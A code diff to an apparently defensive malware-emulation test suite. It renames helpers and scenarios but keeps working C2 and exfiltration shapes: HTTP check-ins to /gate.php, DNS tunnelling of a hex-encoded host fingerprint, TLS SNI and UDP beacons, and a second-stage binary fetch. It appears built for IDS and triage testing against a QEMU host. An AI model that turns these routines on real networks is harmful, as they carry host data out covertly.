@@ -1,14 +1,14 @@
 // SPDX-License-Identifier: GPL-3.0-only
 // Copyright (c) 2026 MikiMiku (MoreMorePwn)
 //
-// c2.c — command-and-control and exfiltration shapes.
+// beaconing.c — command-and-control and exfiltration shapes.
 //
 // The destination is the QEMU host (10.0.2.2) unless --host says otherwise, so
 // a check-in can be captured, decoded and triaged without reaching a third
 // party; TEST-NET or a refused port gives the undelivered baseline. The
 // samples keep the application-layer shape (URI, User-Agent, DNS labels, SNI, JSON body) that
 // network triage and IDS rules look at.
-#include "malware.h"
+#include "samples.h"
 
 #include <arpa/inet.h>
 #include <errno.h>
@@ -22,24 +22,24 @@
 SCENARIO(http_beacon)
 {
     const char *name = "http-beacon";
-    const char *host = mal_host(options);
-    int port = mal_port(options, MAL_HTTP_PORT);
+    const char *host = sample_host(options);
+    int port = sample_port(options, SAMPLE_HTTP_PORT);
     char fingerprint[512];
-    mal_fingerprint(fingerprint, sizeof fingerprint);
+    sample_fingerprint(fingerprint, sizeof fingerprint);
     int delivered = 0;
     for (int round = 0; round < options->rounds; round++) {
         char body[640];
         int length = snprintf(body, sizeof body, "%s&round=%d&stage=checkin", fingerprint, round);
         unsigned long long received = 0;
-        if (mal_http_request(host, port, "POST", "/gate.php", body, (size_t)length, &received) == 0) {
+        if (sample_http_request(host, port, "POST", "/gate.php", body, (size_t)length, &received) == 0) {
             delivered++;
-            mal_note(name, "round %d: POST /gate.php sent, %llu response bytes", round, received);
+            sample_note(name, "round %d: POST /gate.php sent, %llu response bytes", round, received);
         } else {
-            mal_note(name, "round %d: %s:%d unreachable: %s", round, host, port, strerror(errno));
+            sample_note(name, "round %d: %s:%d unreachable: %s", round, host, port, strerror(errno));
         }
-        mal_delay(options->delay_ms);
+        sample_delay(options->delay_ms);
     }
-    mal_pass(name, "%d/%d check-ins to http://%s:%d/gate.php with a browser User-Agent",
+    sample_pass(name, "%d/%d check-ins to http://%s:%d/gate.php with a browser User-Agent",
              delivered, options->rounds, host, port);
     return 0;
 }
@@ -47,25 +47,25 @@ SCENARIO(http_beacon)
 SCENARIO(dns_tunnel)
 {
     const char *name = "dns-tunnel";
-    const char *resolver = options->resolver ? options->resolver : MAL_DNS_ADDR;
+    const char *resolver = options->resolver ? options->resolver : SAMPLE_DNS_ADDR;
     char fingerprint[512];
-    mal_fingerprint(fingerprint, sizeof fingerprint);
+    sample_fingerprint(fingerprint, sizeof fingerprint);
     char encoded[1024];
-    size_t encoded_len = mal_hex(fingerprint, encoded, sizeof encoded);
+    size_t encoded_len = sample_hex(fingerprint, encoded, sizeof encoded);
     int asked = 0, answered = 0;
     for (int round = 0; round < options->rounds; round++) {
         char question[160];
         size_t offset = encoded_len ? (size_t)round * 17 % encoded_len : 0;
-        snprintf(question, sizeof question, "%.40s.%s", encoded + offset, MAL_EXFIL_DOMAIN);
+        snprintf(question, sizeof question, "%.40s.%s", encoded + offset, SAMPLE_EXFIL_DOMAIN);
         // A and TXT: a tunnel that carries data out and instructions back.
-        answered += mal_dns_ask(resolver, question, 1, 300);
-        answered += mal_dns_ask(resolver, question, 16, 300);
+        answered += sample_dns_ask(resolver, question, 1, 300);
+        answered += sample_dns_ask(resolver, question, 16, 300);
         asked += 2;
-        mal_delay(options->delay_ms);
+        sample_delay(options->delay_ms);
     }
-    mal_pass(name, "%d encoded questions for %s to %s (%d answered)", asked, MAL_EXFIL_DOMAIN,
+    sample_pass(name, "%d encoded questions for %s to %s (%d answered)", asked, SAMPLE_EXFIL_DOMAIN,
              resolver, answered);
-    mal_note(name, "labels carry the host fingerprint, not random names");
+    sample_note(name, "labels carry the host fingerprint, not random names");
     return 0;
 }
 
@@ -127,44 +127,44 @@ static size_t client_hello(unsigned char *out, const char *sni)
 SCENARIO(tls_sni)
 {
     const char *name = "tls-sni";
-    const char *host = mal_host(options);
-    int port = mal_port(options, MAL_TLS_PORT);
+    const char *host = sample_host(options);
+    int port = sample_port(options, SAMPLE_TLS_PORT);
     unsigned char hello[512];
-    size_t length = client_hello(hello, MAL_SNI);
-    int fd = mal_dial(host, port, 1500);
+    size_t length = client_hello(hello, SAMPLE_SNI);
+    int fd = sample_dial(host, port, 1500);
     unsigned long long answered = 0;
     if (fd < 0) {
-        mal_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
+        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
     } else {
-        if (mal_send_all(fd, hello, length) == 0) {
+        if (sample_send_all(fd, hello, length) == 0) {
             unsigned char reply[512];
-            ssize_t got = mal_recv_wait(fd, reply, sizeof reply, 500);
+            ssize_t got = sample_recv_wait(fd, reply, sizeof reply, 500);
             if (got > 0)
                 answered = (unsigned long long)got;
         }
         close(fd);
     }
-    mal_pass(name, "ClientHello %zu bytes with SNI %s to %s:%d (%llu response bytes)", length,
-             MAL_SNI, host, port, answered);
+    sample_pass(name, "ClientHello %zu bytes with SNI %s to %s:%d (%llu response bytes)", length,
+             SAMPLE_SNI, host, port, answered);
     return 0;
 }
 
 SCENARIO(udp_beacon)
 {
     const char *name = "udp-beacon";
-    const char *host = mal_host(options);
-    int port = mal_port(options, MAL_UDP_PORT);
+    const char *host = sample_host(options);
+    int port = sample_port(options, SAMPLE_UDP_PORT);
     struct sockaddr_in target;
     memset(&target, 0, sizeof target);
     target.sin_family = AF_INET;
     target.sin_port = htons((uint16_t)port);
     if (inet_pton(AF_INET, host, &target.sin_addr) != 1) {
-        mal_fail(name, "host %s is not an IPv4 address", host);
+        sample_fail(name, "host %s is not an IPv4 address", host);
         return 1;
     }
     int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
     if (fd < 0) {
-        mal_fail(name, "socket: %s", strerror(errno));
+        sample_fail(name, "socket: %s", strerror(errno));
         return 1;
     }
     unsigned long long bytes = 0;
@@ -180,29 +180,29 @@ SCENARIO(udp_beacon)
             sent++;
             bytes += (unsigned long long)written;
         }
-        mal_delay(options->delay_ms);
+        sample_delay(options->delay_ms);
     }
     close(fd);
-    mal_pass(name, "%d/%d JSON datagrams, %llu bytes to %s:%d", sent, options->rounds, bytes, host,
+    sample_pass(name, "%d/%d JSON datagrams, %llu bytes to %s:%d", sent, options->rounds, bytes, host,
              port);
-    mal_note(name, "UDP is fire-and-forget: sendto success does not mean delivery");
+    sample_note(name, "UDP is fire-and-forget: sendto success does not mean delivery");
     return 0;
 }
 
-SCENARIO(stage2)
+SCENARIO(download)
 {
-    const char *name = "stage2";
-    const char *host = mal_host(options);
-    int port = mal_port(options, MAL_HTTP_PORT);
+    const char *name = "download";
+    const char *host = sample_host(options);
+    int port = sample_port(options, SAMPLE_HTTP_PORT);
     unsigned long long received = 0;
-    int ok = mal_http_request(host, port, "GET", "/stage2.bin", NULL, 0, &received) == 0;
+    int ok = sample_http_request(host, port, "GET", "/download.bin", NULL, 0, &received) == 0;
     if (!ok)
-        mal_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
+        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
     else if (received == 0)
-        mal_note(name, "request sent, no response bytes; nothing to execute");
+        sample_note(name, "request sent, no response bytes; nothing to execute");
     else
-        mal_note(name, "%llu response bytes fetched; the sample never executes them", received);
-    mal_pass(name, "GET http://%s:%d/stage2.bin attempted (%s)", host, port,
+        sample_note(name, "%llu response bytes fetched; the sample never executes them", received);
+    sample_pass(name, "GET http://%s:%d/download.bin attempted (%s)", host, port,
              !ok ? "no connection" : received > 0 ? "response received" : "request sent, no response");
     return 0;
 }
